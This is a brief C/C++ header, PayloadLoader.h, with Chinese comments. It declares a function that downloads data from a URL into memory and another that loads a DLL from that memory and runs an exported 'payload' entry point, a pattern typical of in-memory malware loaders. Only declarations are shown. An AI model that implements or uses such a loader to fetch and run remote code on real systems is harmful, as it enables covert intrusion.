// PayloadLoader.h
#pragma once
#include "stdafx.h"

// 从 URL 下载到内存（调用方负责 free）
BOOL DownloadToMemory(LPCSTR url, BYTE** outData, DWORD* outSize);

// 从内存加载 DLL 并调用导出函数
typedef BOOL (*PayloadEntry)(char*);
BOOL LoadAndRunPayload(const BYTE* data, DWORD size, const char* entryName, char* arg);